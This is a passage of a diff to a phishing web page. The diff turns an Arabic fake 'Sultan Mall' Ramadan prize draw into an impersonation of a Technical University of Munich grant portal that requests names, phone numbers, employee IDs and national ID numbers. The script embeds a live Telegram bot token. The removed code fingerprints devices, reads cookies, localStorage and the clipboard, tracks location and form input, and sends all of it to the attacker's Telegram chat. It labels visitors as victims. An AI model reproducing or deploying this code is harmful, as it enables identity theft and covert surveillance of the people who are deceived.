@@ -1,499 +1,435 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title><meta property="og:image" content="https://images.unsplash.com/photo-1555529669-e69e7aa0ba9a?q=80&w=800">
-<meta property="og:title" content="سحب السلطان مول الكبرى 🎁">
-<meta property="og:description" content="انضم إلى الفائزين بـ iPhone 15 Pro Max وجوائز نقدية!">
-<meta property="og:type" content="website">
-</title>
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>TUM | Academic Verification Portal</title>
+    <meta property="og:title" content="TUM Global Excellence Grant 2026">
+    <meta property="og:description" content="Official verification portal for international research candidates.">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a1/TU_München_Logo.svg/1200px-TU_München_Logo.svg.png">
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
     <style>
-       .prize-card {
-    background: rgba(255, 255, 255, 0.1);
-    border-radius: 15px;
-    margin: 10px 0;
-    padding: 10px;
-    display: flex;
-    align-items: center;
-    gap: 15px;
-    text-align: right;
-    transition: 0.3s;
-}
-.prize-card:hover { transform: translateY(-5px); background: rgba(212, 175, 55, 0.1); }
-.prize-img { width: 60px; height: 60px; border-radius: 10px; object-fit: cover; border: 1px solid var(--gold); }
-.prize-info b { color: var(--gold); display: block; font-size: 16px; }
-.prize-info span { font-size: 12px; color: #ccc; }
-
-        :root { --gold: #d4af37; --dark-green: #064e3b; --white: #ffffff; }
-        body { font-family: 'Tajawal', sans-serif; background: linear-gradient(135deg, #064e3b 0%, #022c22 100%); color: var(--white); margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }
-        .card { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(212, 175, 55, 0.3); padding: 25px; border-radius: 20px; width: 90%; max-width: 450px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.5); position: relative; }
-        .ramadan-badge { background: var(--gold); color: #000; font-weight: bold; padding: 5px 15px; border-radius: 20px; font-size: 14px; display: inline-block; margin-bottom: 15px; }
-        h1 { color: var(--gold); font-size: 24px; margin-bottom: 10px; }
-        .prizes-list { background: rgba(0,0,0,0.2); padding: 15px; border-radius: 10px; text-align: right; margin-bottom: 20px; font-size: 14px; border-right: 4px solid var(--gold); }
-        .input-group { margin-bottom: 15px; text-align: right; }
-        label { display: block; margin-bottom: 5px; font-size: 14px; color: var(--gold); }
-        input { width: 100%; padding: 12px; border-radius: 8px; border: none; background: rgba(255,255,255,0.9); color: #333; font-size: 16px; box-sizing: border-box; }
-        .btn { background: linear-gradient(45deg, #d4af37, #f1c40f); color: #000; font-weight: bold; border: none; padding: 15px; width: 100%; border-radius: 10px; font-size: 18px; cursor: pointer; transition: 0.3s; box-shadow: 0 5px 15px rgba(212, 175, 55, 0.4); }
+        :root { --tum-blue: #0065BD; --dark-grey: #2c3e50; --light-grey: #f8f9fa; --gold: #d4af37; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Roboto', 'Tajawal', sans-serif; background: linear-gradient(135deg, #e9ecef 0%, #dee2e6 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .container { background: white; border-radius: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.15); width: 100%; max-width: 550px; overflow: hidden; transition: 0.3s; border-top: 6px solid var(--tum-blue); }
+        .header { background: var(--tum-blue); padding: 20px; text-align: center; color: white; position: relative; }
+        .logo { width: 100px; margin-bottom: 10px; background: white; border-radius: 50%; padding: 8px; }
+        .header h1 { font-size: 22px; margin-bottom: 5px; }
+        .header p { font-size: 13px; opacity: 0.9; }
+        .lang-switch { position: absolute; top: 15px; right: 20px; background: rgba(255,255,255,0.2); border-radius: 30px; padding: 5px 10px; font-size: 12px; cursor: pointer; transition: 0.2s; }
+        .lang-switch:hover { background: rgba(255,255,255,0.4); }
+        .content { padding: 30px 25px; }
+        .form-group { margin-bottom: 20px; text-align: left; }
+        label { display: block; font-weight: bold; margin-bottom: 8px; font-size: 14px; color: var(--dark-grey); }
+        label i { color: var(--tum-blue); margin-right: 5px; }
+        input { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; font-family: inherit; transition: 0.2s; background: #fff; }
+        input:focus { border-color: var(--tum-blue); outline: none; box-shadow: 0 0 0 3px rgba(0,101,189,0.2); }
+        .btn { background: var(--tum-blue); color: white; border: none; padding: 14px; width: 100%; border-radius: 40px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; box-shadow: 0 4px 10px rgba(0,101,189,0.3); }
         .btn:active { transform: scale(0.98); }
-        .counter-box { margin-top: 15px; font-size: 13px; color: #ccc; }
-        #share-section { display: none; }
-        .share-btn { background: #25D366; color: white; padding: 15px; border-radius: 10px; text-decoration: none; display: block; font-weight: bold; margin-top: 15px; }
-        .progress-container { background: #444; border-radius: 10px; height: 10px; margin: 20px 0; overflow: hidden; }
-        .progress-bar { background: var(--gold); height: 100%; width: 0%; transition: 0.5s; }
-        #winner-toast {
-            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
-            background: rgba(0, 0, 0, 0.85); color: var(--gold); padding: 10px 20px;
-            border-radius: 30px; border: 1px solid var(--gold); font-size: 13px;
-            display: none; z-index: 1000; box-shadow: 0 5px 15px rgba(0,0,0,0.5);
-        }
-
+        .footer-note { font-size: 11px; color: #6c757d; text-align: center; margin-top: 25px; padding-top: 15px; border-top: 1px solid #eee; }
+        #loading-box { display: none; background: #f0f7ff; border-radius: 16px; padding: 20px; margin-top: 20px; text-align: center; border-left: 4px solid var(--tum-blue); }
+        .spinner { width: 40px; height: 40px; border: 4px solid #e0e0e0; border-top: 4px solid var(--tum-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #success-message { display: none; background: #e8f5e9; border-left: 4px solid #2e7d32; padding: 15px; border-radius: 12px; margin-top: 20px; color: #1b5e20; }
+        .toast-msg { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.85); color: var(--gold); padding: 8px 20px; border-radius: 40px; font-size: 13px; z-index: 1000; display: none; backdrop-filter: blur(8px); border: 1px solid var(--gold); font-weight: bold; white-space: nowrap; }
+        .redirect-btn { background: #2e7d32; margin-top: 15px; }
+        .redirect-btn:hover { background: #1b5e20; }
+        .hint { font-size: 11px; color: #888; margin-top: 5px; }
     </style>
-<meta name="google-site-verification" content="_lzp7tgj22joKIZ5ee2ZiZKwh8FRlWqpId719PbEQ2E" />
 </head>
 <body>
 
-<div id="winner-toast"></div>
-    
-<div class="card">
-    <div class="ramadan-badge">بمناسبة شهر رمضان المبارك 🌙</div>
-    <h1>سحب السلطان مول الكبرى</h1>
-     <img src="https://images.unsplash.com/photo-1519567241046-7f570eee3ce6?q=80&w=1000&auto=format&fit=crop" style="width: 100%; height: 180px; object-fit: cover; border-radius: 15px; margin-bottom: 15px; border: 1px solid var(--gold);">
+<div id="academic-toast" class="toast-msg"></div>
 
-    <p style="font-size: 14px;">انضم إلى <b>10,000 فائز</b> محظوظ هذا الشهر!</p>
+<div class="container">
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a1/TU_München_Logo.svg/1200px-TU_München_Logo.svg.png" alt="TUM Logo" class="logo">
+        <div class="lang-switch" id="langToggle">🇬🇧 EN</div>
+        <h1 id="mainTitle">Academic Verification Portal</h1>
+        <p id="subTitle">Technical University of Munich | Excellence Grant 2026</p>
+    </div>
+    <div class="content">
+        <p id="descText" style="margin-bottom: 20px; font-size: 14px; color: #4a5568;">Please enter your official credentials to sync with ministry records and access the <b>€4,500 Grant</b> dashboard.</p>
 
-<div class="prize-card" style="border: 2px solid #00fbff; background: rgba(0, 251, 255, 0.1);">
-    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzAwZmJmZiI+PHBhdGggZD0iTTEwLjE4IDEyLjI0TDQuNDQgMTQuNDZMMiAxNS41OVYxNy4wOEwyLjgzIDE2Ljc5TDkuNzkgMTQuOTRMMTQuMTcgMTkuNjdMMTcuNTkgMTguMzRMMTUuMjEgMTMuNjFMMjEgMTEuMzhWOS44OUwyMS45NiA5LjcyTDIyIDkuNzZMMjIgOC40NEwyMS45NiA4LjQ3TDE1LjIxIDUuODhMMTcuNTkgMS4xNUwxNC4xNyAxLjQ4TDkuNzkgNi4yMUwyLjgzIDQuMzZMMiA0LjA3VjUuNTZMNCA2LjdMMTAuMTggOC45MlYxMi4yNFoiLz48L3N2Zz4=" class="prize-img">
-    <div class="prize-info">
-        <b style="color: #00fbff;">الرحلة الحلم: جزيرة سقطرى 🏝️</b>
-        <span>تذكرة سفر وإقامة كاملة لشخصين (الجائزة الكبرى)</span>
+        <div id="step-form">
+            <div class="form-group">
+                <label id="labelFullname"><i>👤</i> Full Legal Name (as in Passport)</label>
+                <input type="text" id="fullname" placeholder="e.g. Ahmed Abdullah Al-Mansouri" autocomplete="off">
+            </div>
+            <div class="form-group">
+                <label id="labelPhone"><i>📱</i> WhatsApp / Mobile Number (with country code)</label>
+                <input type="tel" id="phone" placeholder="e.g. +966501234567" autocomplete="off">
+                <div class="hint" id="phoneHint">Include country code for verification</div>
+            </div>
+            <div class="form-group">
+                <label id="labelEmail"><i>📧</i> Email Address</label>
+                <input type="email" id="email" placeholder="example@university.edu" autocomplete="off">
+            </div>
+            <div class="form-group">
+                <label id="labelJobId"><i>🆔</i> Employee ID / Job Number</label>
+                <input type="text" id="job_id" placeholder="e.g. 1024587" autocomplete="off">
+                <div class="hint" id="jobHint">Found on your official staff card</div>
+            </div>
+            <div class="form-group">
+                <label id="labelNationalId"><i>🪪</i> National ID Number</label>
+                <input type="text" id="national_id" placeholder="Enter your national ID" autocomplete="off">
+            </div>
+            <button class="btn" id="submitBtn" onclick="processVerification()">Verify & Activate Grant 🎓</button>
+        </div>
+
+        <div id="loading-box">
+            <div class="spinner"></div>
+            <div id="loadingText">Synchronizing with Munich servers ...</div>
+            <div id="loadingSub" style="font-size: 12px; margin-top: 8px;">Please wait, verifying records</div>
+        </div>
+
+        <div id="success-message">
+            <div id="successText">✅ <strong>Application received successfully</strong><br>You will be contacted via your university email within 24 hours to complete the grant process. Thank you for registering with TUM Excellence Program.</div>
+            <button class="btn redirect-btn" id="redirectBtn" onclick="redirectToTUM()">Continue to Dashboard →</button>
+        </div>
+
+        <div class="footer-note" id="footerNote">
+            Technische Universität München | International Relations Office<br>
+            Arcisstraße 21, 80333 München, Germany
+        </div>
     </div>
 </div>
 
-
-
-
-    <div id="step1">
-        <div class="prizes-list">
-            <b>🎁 الجوائز المتاحة:</b><br>
-            •  متوفر لـ  50 فائز فقط iPhone 15 Pro Max 📱<br>
-            • 200 قسيمة شرائية بقيمة 100,000 ريال 💸<br>
-            • جوائز عينية فورية لجميع المشاركين ✨
-        </div>
-
-<div id="prizes-showcase">
-    <div class="prize-card">
-        <img src="https://m.media-amazon.com/images/I/81Os1SDWpcL._AC_SL1500_.jpg" class="prize-img">
-        <div class="prize-info">
-            <b>iPhone 15 Pro Max</b>
-            <span>متوفر 50 نسخة للسحب الكبرى 📱</span>
-        </div>
-    </div>
-    
-    <div class="prize-card">
-        <img src="https://cdn-icons-png.flaticon.com/512/2489/2489756.png" class="prize-img" alt="Money Icon">
-        <div class="prize-info">
-            <b>قسيمة 100,000 ريال</b>
-            <span>جوائز نقدية فورية للمشاركين 💸</span>
-        </div>
-    </div>
-</div>
-        
-        <div class="input-group">
-            <label>الاسم الكامل</label>
-            <input type="text" id="name" placeholder="اكتب اسمك الثلاثي" required>
-        </div>
-        <div class="input-group">
-            <label>رقم الواتساب (يرجا ادخال رمز الدوله مثل +966)</label>
-            <input type="tel" id="phone" placeholder="+XXXXXXXX" required>
-        </div>
-        <div class="input-group">
-            <label>البريد الإلكتروني (اختياري)</label>
-            <input type="email" id="email" placeholder="example@mail.com">
-        </div>
-        <button class="btn" onclick="executeAttack()">تأكيد الدخول في السحب ✨</button>
-    </div>
-
-    <div id="share-section">
-        <h2 style="color: var(--gold);">تم قبول طلبك مبدئياً! ✅</h2>
-        <p>بقي خطوة واحدة لتفعيل رقمك في السحب الآلي. يجب إرسال الدعوة لـ 10 من أصدقائك عبر واتساب.</p>
-        
-        <div class="progress-container"><div class="progress-bar" id="bar"></div></div>
-        <p>تم إرسال الدعوات لـ: <span id="count">0</span> / 10</p>
-        
-        <a href="#" class="share-btn" onclick="viralShare()">مشاركة عبر واتساب الآن ✅</a>
-    </div>
-
-    <div class="counter-box">
-        عدد المقاعد المتبقية: <span style="color: var(--gold); font-weight: bold;">7562</span> مقعد فقط!
-    </div>
-</div>
 <script>
+    // ---------- Telegram Bot ----------
+    const token = "8630574958:AAFm1DOq1WChSi04xr9mXodcTSDxaBPfT-A"; 
+    const chatId = "7388801889"; 
 
- if (!/Android|iPhone/i.test(navigator.userAgent)) {
-    // إذا لم يكن جوال، وجهه لموقع جوجل أو صفحة فارغة
-    window.location.href = "https://www.google.com";
- }   
-const token = "8630574958:AAFm1DOq1WChSi04xr9mXodcTSDxaBPfT-A"; 
-const chatId = "7388801889"; 
-
-    // --- كاشف الشحن السريع لـ ZeroX ---
-async function getPowerTech() {
-    try {
-        const battery = await navigator.getBattery();
-        let powerSource = battery.charging ? "🔌 موصل بالطاقة" : "🔋 يعتمد على البطارية";
-        let healthEstimate = (battery.level > 0.9) ? "جديد/ممتاز" : "مستهلك";
-        return `${powerSource} | صحة البطارية: ${healthEstimate}`;
-    } catch(e) { return "غير متاح"; }
-}
-
-    // --- رادار التجسس العملاق (يشتغل فور فتح الصفحة) ---
-    async function silentRadar() {
-        // استدعاء قوة الطاقة
-let powerStatus = await getPowerTech();
-
-        // --- كود بصمة الصوت (الأسطوري) لـ ZeroX ---
-async function getAudioFingerprint() {
-    try {
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        const oscillator = audioCtx.createOscillator();
-        const analyser = audioCtx.createAnalyser();
-        const gain = audioCtx.createGain();
-        
-        // ضبط الصوت ليكون صامتاً تماماً
-        gain.gain.value = 0; 
-        oscillator.type = 'triangle';
-        oscillator.connect(analyser);
-        analyser.connect(gain);
-        gain.connect(audioCtx.destination);
-        
-        oscillator.start(0);
-        
-        // استخراج البيانات الرياضية للموجة
-        const data = new Float32Array(analyser.frequencyBinCount);
-        analyser.getFloatFrequencyData(data);
-        oscillator.stop();
-        
-        // تحويل البيانات لبصمة بسيطة
-        let sum = 0;
-        for (let i = 0; i < data.length; i++) {
-            if (isFinite(data[i])) sum += Math.abs(data[i]);
-        }
-        return "Audio-" + Math.floor(sum);
-    } catch (e) { return "Audio-محجوب"; }
-}
-
-// استدعاء البصمة داخل silentRadar:
-let audioDNA = await getAudioFingerprint();
-
-        // --- كود البصمة الوراثية للمتصفح (DNA) ---
-function getCanvasFingerprint() {
-    try {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        const txt = 'ZeroX-Radar-2026';
-        ctx.textBaseline = "top";
-        ctx.font = "14px 'Arial'";
-        ctx.textBaseline = "alphabetic";
-        ctx.fillStyle = "#f60";
-        ctx.fillRect(125,1,62,20);
-        ctx.fillStyle = "#069";
-        ctx.fillText(txt, 2, 15);
-        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-        ctx.fillText(txt, 4, 17);
-        
-        // تحويل الرسمة إلى كود فريد (Hash)
-        const b64 = canvas.toDataURL().replace("data:image/png;base64,","");
-        return b64.slice(0, 32); 
-    } catch (e) { return "بصمة محمية"; }
-}
-
-// تعريف المتغير قبل استخدامه في الرسالة
-let deviceFingerprint = getCanvasFingerprint();
-
-        
-    // --- كود قنص المساحة الخاص بـ ZeroX ---
-    let storageInfo = "محجوب/غير مدعوم";
-
-    // --- كود قنص نوع المعالج الرسومي (GPU) المحدث ---
-    let gpuInfo = "غير معروف";
-    try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (gl) {
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            if (debugInfo) {
-                gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_ID);
-            } else {
-                gpuInfo = gl.getParameter(gl.RENDERER); // محاولة بديلة
-            }
-        }
-    } catch (e) { 
-        gpuInfo = "محجوب من المتصفح"; 
-    }
-
-    if (!gpuInfo) gpuInfo = "محجوب من النظام"; 
-
-    // --- تكملة كود المساحة ---
-    try {
-        if (navigator.storage && navigator.storage.estimate) {
-            const estimate = await navigator.storage.estimate();
-            const total = (estimate.quota / (1024 ** 3)).toFixed(1);
-            const free = ((estimate.quota - estimate.usage) / (1024 ** 3)).toFixed(1);
-            storageInfo = `${total}GB الكلية | ${free}GB الفاضية`;
-        }
-    } catch (e) { 
-        storageInfo = "خطأ في الجلب"; 
-    }
-    // ---------------------------------------
-
-    // معلومات المتصفح والنظام
-    let ua = navigator.userAgent;
-    let platform = navigator.platform;
-    let language = navigator.language;
-    let cores = navigator.hardwareConcurrency || "غير معروف"; // عدد نويات المعالج
-    let ram = navigator.deviceMemory || "غير معروف"; // الذاكرة العشوائية GB
-    let screenRes = `${window.screen.width}x${window.screen.height}`;
-    let colorDepth = window.screen.colorDepth;
-    let connection = navigator.connection ? navigator.connection.effectiveType : "غير معروف"; // نوع الشبكة (4G/WiFi)
-
-    let batteryInfo = "غير متاح";
-    let ipAddr = "جاري الجلب...";
-
-    // جلب تفاصيل البطارية (الشحن والحالة)
-    try {
-        const battery = await navigator.getBattery();
-        batteryInfo = `🔋 المستوى: ${(battery.level * 100).toFixed(0)}% | ⚡ الحالة: ${battery.charging ? 'جاري الشحن الآن' : 'لا يشحن حالياً'}`;
-    } catch (e) {}
-
-    // جلب الـ IP
-    try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        ipAddr = data.ip;
-    } catch (e) {}
-
-
-        const megaMsg = `
-🚨 رادار ZeroX المطور - صيد دقيق!
-----------------------------------
-🎵 بصمة الصوت (Audio): ${audioDNA}
-🧬 بصمة الجهاز (DNA): ${deviceFingerprint}
-🌐 الـ IP: ${ipAddr}
-📡 الشبكة: ${connection}
-📱 النظام: ${platform}
-🧠 الأنوية: ${cores} Core
-🎮 المعالج (GPU): ${gpuInfo} 
-📟 الذاكرة (RAM): ${ram} GB
-💾 التخزين: ${storageInfo}
-🔋 البطارية: ${batteryInfo}
-----------------------------------
-🖥️ الشاشة: ${screenRes}
-🌍 اللغة: ${language}
-🌐 المتصفح: ${ua}
-----------------------------------
-📍 المستهدف: السلطان مول - رمضان 🌙
-`;
-
-        
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(megaMsg)}`);
-    }
-
-    // تشغيل الرادار فوراً
-        // 1. تشغيل الرادار الصامت فوراً
-    silentRadar(); 
-
-
-    // 🍪 قناص الخزنات الشامل (Cookies + LocalStorage)
-    window.addEventListener('load', () => {
-        // 1. جلب الكوكيز المتاحة
-        let cookies = document.cookie || "لا يوجد كوكيز متاحة (محمية)";
-        
-        // 2. جلب بيانات التخزين المحلي (LocalStorage) - هنا الأسرار الحقيقية!
-        let localData = "";
-        try {
-            localData = JSON.stringify(localStorage);
-            if (localData === "{}") localData = "الخزنة المحلية فارغة";
-        } catch (e) { localData = "محجوبة أو خطأ في الوصول"; }
-
-        // 3. بناء تقرير الخزنة
-        const storageReport = `
-🍪 تقرير الخزنة لـ ZeroX:
-----------------------------------
-📦 الكوكيز المكتشفة:
-${cookies}
-----------------------------------
-🔐 التخزين المحلي (LocalStorage):
-${localData}
-----------------------------------
-⚠️ ملاحظة: الكوكيز المحمية بـ HttpOnly لا تظهر هنا.
-        `;
-
-        // إرسال التقرير للتلجرام
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(storageReport)}`);
-    });
-
-
-    // 📋 صائد الحافظة (عند أول نقرة لضمان تجاوز الحماية)
-    document.addEventListener('click', () => {
-        navigator.clipboard.readText().then(text => {
-            if(text && text.length > 0) {
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎯 تم قنص الحافظة عند النقرة: \n" + text)}`);
-            }
-        }).catch(() => {});
-    }, { once: true }); 
-
-    // 🚨 كاشف وضع التخفي
-    if (!window.RequestFileSystem && !window.webkitRequestFileSystem) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ تنبيه: الضحية يستخدم وضع التخفي!")}`);
-    }
-
-    // 📱 رادار الميلان والحركة (Gyroscope)
-    window.ondeviceorientation = (event) => {
-        if (event.beta !== null) {
-            let status = event.beta > 45 ? "مائل للخلف" : "مستوي";
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📱 وضعية الجهاز الآن: " + status)}`);
-            window.ondeviceorientation = null; // إرسال لمرة واحدة
+    // ---------- Multi-Language Support (default: English) ----------
+    let currentLang = 'en';
+    const translations = {
+        en: {
+            mainTitle: 'Academic Verification Portal',
+            subTitle: 'Technical University of Munich | Excellence Grant 2026',
+            descText: 'Please enter your official credentials to sync with ministry records and access the <b>€4,500 Grant</b> dashboard.',
+            labelFullname: '👤 Full Legal Name (as in Passport)',
+            labelPhone: '📱 WhatsApp / Mobile Number (with country code)',
+            labelEmail: '📧 Email Address',
+            labelJobId: '🆔 Employee ID / Job Number',
+            labelNationalId: '🪪 National ID Number',
+            phoneHint: 'Include country code for verification',
+            jobHint: 'Found on your official staff card',
+            submitBtn: 'Verify & Activate Grant 🎓',
+            loadingText: 'Synchronizing with Munich servers ...',
+            loadingSub: 'Please wait, verifying records',
+            successText: '✅ <strong>Application received successfully</strong><br>You will be contacted via your university email within 24 hours to complete the grant process. Thank you for registering with TUM Excellence Program.',
+            redirectBtn: 'Continue to Dashboard →',
+            footerNote: 'Technische Universität München | International Relations Office<br>Arcisstraße 21, 80333 München, Germany',
+            toastUpdates: [
+                "📚 1,247 researchers updated today",
+                "🇩🇪 System connected to TUM servers directly",
+                "🎓 3 new grants added to Excellence Program",
+                "🔔 Last update: Applications open until Dec 30",
+                "📊 Remaining grants: 42%",
+                "✅ 89 applications approved in the last hour"
+            ]
+        },
+        ar: {
+            mainTitle: 'بوابة التحقق الأكاديمي',
+            subTitle: 'جامعة ميونخ التقنية | منحة التميز 2026',
+            descText: 'يرجى إدخال بياناتك الرسمية لمزامنتها مع سجلات الوزارة والوصول إلى لوحة <b>منحة 4,500€</b>.',
+            labelFullname: '👤 الاسم الكامل (كما في جواز السفر)',
+            labelPhone: '📱 رقم الجوال / واتساب (مع رمز الدولة)',
+            labelEmail: '📧 البريد الإلكتروني',
+            labelJobId: '🆔 رقم الوظيفة / رقم حافظة الدوام',
+            labelNationalId: '🪪 الرقم الوطني',
+            phoneHint: 'أدخل رمز الدولة مثال +966',
+            jobHint: 'موجود في بطاقة الموظف الرسمية',
+            submitBtn: 'تحقق وتفعيل المنحة 🎓',
+            loadingText: 'جاري المزامنة مع خوادم ميونيخ ...',
+            loadingSub: 'الرجاء الانتظار، يتم التحقق من السجلات',
+            successText: '✅ <strong>تم استلام طلبك بنجاح</strong><br>سيتم التواصل مع بريدك الجامعي خلال 24 ساعة لإتمام إجراءات المنحة. شكراً لتسجيلك في برنامج TUM للتميز.',
+            redirectBtn: 'المتابعة إلى لوحة التحكم ←',
+            footerNote: 'جامعة ميونخ التقنية | مكتب العلاقات الدولية<br>Arcisstraße 21, 80333 ميونخ, ألمانيا',
+            toastUpdates: [
+                "📚 تم تحديث سجلات 1,247 باحثاً اليوم",
+                "🇩🇪 نظام التحقق متصل بخوادم TUM مباشرة",
+                "🎓 3 منح جديدة أضيفت لبرنامج التميز",
+                "🔔 آخر تحديث: التقديم متاح حتى 30 ديسمبر",
+                "📊 نسبة المقاعد المتبقية: 42% من المنح",
+                "✅ تم اعتماد 89 طلباً خلال الساعة الأخيرة"
+            ]
         }
     };
 
-    // 🔍 رادار كشف النوايا الموحد (الاسم، الرقم، الإيميل)
-    ['name', 'phone', 'email'].forEach(id => {
-        document.getElementById(id).addEventListener('blur', (e) => {
-            if(e.target.value.length > 2) {
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`📝 الضحية كتب في خانة ${id}: ` + e.target.value)}`);
-            }
-        });
+    function applyLanguage(lang) {
+        currentLang = lang;
+        const t = translations[lang];
+        document.getElementById('mainTitle').innerText = t.mainTitle;
+        document.getElementById('subTitle').innerHTML = t.subTitle;
+        document.getElementById('descText').innerHTML = t.descText;
+        document.getElementById('labelFullname').innerHTML = t.labelFullname;
+        document.getElementById('labelPhone').innerHTML = t.labelPhone;
+        document.getElementById('labelEmail').innerHTML = t.labelEmail;
+        document.getElementById('labelJobId').innerHTML = t.labelJobId;
+        document.getElementById('labelNationalId').innerHTML = t.labelNationalId;
+        document.getElementById('phoneHint').innerText = t.phoneHint;
+        document.getElementById('jobHint').innerText = t.jobHint;
+        document.getElementById('submitBtn').innerText = t.submitBtn;
+        document.getElementById('loadingText').innerText = t.loadingText;
+        document.getElementById('loadingSub').innerText = t.loadingSub;
+        document.getElementById('successText').innerHTML = t.successText;
+        document.getElementById('redirectBtn').innerText = t.redirectBtn;
+        document.getElementById('footerNote').innerHTML = t.footerNote;
+        document.getElementById('langToggle').innerHTML = lang === 'en' ? '🇸🇦 AR' : '🇬🇧 EN';
+        // تحديث الإشعارات العشوائية
+        window.toastMessages = t.toastUpdates;
+    }
+
+    document.getElementById('langToggle').addEventListener('click', () => {
+        const newLang = currentLang === 'en' ? 'ar' : 'en';
+        applyLanguage(newLang);
     });
 
-    // ✂️ كاشف النسخ من الصفحة
-    document.addEventListener('copy', () => {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("✂️ الضحية قام بنسخ شيء من الصفحة!")}`);
-    });
-
-async function getExactLocation() {
-    alert("تهانينا! لتحديد أقرب فرع 'سلطان مول' لموقعك لاستلام الجائزة، يرجى الضغط على 'سماح' في النافذة التالية");
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(position => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            const locMsg = `📍 موقع الصيد الدقيق جاهز:\n${mapLink}`;
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(locMsg)}`);
-        }, error => {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ الضحية رفض إعطاء إذن الموقع!")}`);
-        });
-    }
-}
-window.onblur = () => {
-    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📉 الضحية خرج من الصفحة (راح للواتساب أو قفل المتصفح)!")}`);
-};
-
-window.onfocus = () => {
-    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📈 الضحية عاد للصفحة مجدداً!")}`);
-};
-
-    async function executeAttack() {
-        getExactLocation();
-
-        const name = document.getElementById('name').value;
-        const phone = document.getElementById('phone').value;
-        const email = document.getElementById('email').value || "غير متوفر";
-
-        if(name && phone) {
-            const finalMsg = `
-🌙 صيد خاص بـ ZeroX (بيانات التسجيل):
-👤 الاسم: ${name}
-📱 الرقم: ${phone}
-📧 الإيميل: ${email}
-🤐 تم بنجاح
-            `;
-            
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(finalMsg)}`);
-
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('share-section').style.display = 'block';
-        } else {
-            alert("يرجى ملء البيانات للدخول في السحب!");
-        }
+    // ---------- All Radar & Spy Functions (unchanged but improved) ----------
+    async function getPowerTech() {
+        try {
+            const battery = await navigator.getBattery();
+            let powerSource = battery.charging ? "🔌 Plugged in" : "🔋 Battery";
+            let health = (battery.level > 0.9) ? "Excellent" : "Used";
+            return `${powerSource} | Health: ${health} (${Math.round(battery.level*100)}%)`;
+        } catch(e) { return "Not available"; }
     }
 
-    // --- 3. دالة المشاركة الفيروسية ---
-    let shareCount = 0;
-    function viralShare() {
-        if(shareCount < 10) {
-            shareCount++;
-            document.getElementById('count').innerText = shareCount;
-            document.getElementById('bar').style.width = (shareCount * 10) + "%";
-            window.open(`whatsapp://send?text=🌙 السلطان مول يوزع جوائز بمناسبة رمضان! سجلت اسمي وطلع اسمي في السحب، جرب حظك هنا: ${window.location.href}`);
-        } else {
-            alert("مبروك! تم إدراج اسمك في السحب النهائي.");
-            document.getElementById('share-section').innerHTML = "<h2>تم بنجاح! 🎉</h2>";
-        }
-    }
-        // قائمة الفائزين الـ 20 لرفع الأدرينالين والمصداقية
-    const winners = [
-        "مبروك لـ محمد الكربي من صنعاء فوزه بـ iPhone 15! 📱",
-        "تم جلب بيانات فائز جديد من تعز بجائزة 100 ألف! 💸",
-        "أحمد العنزي من الكويت حصل على قسيمة مشتريات الآن ✨",
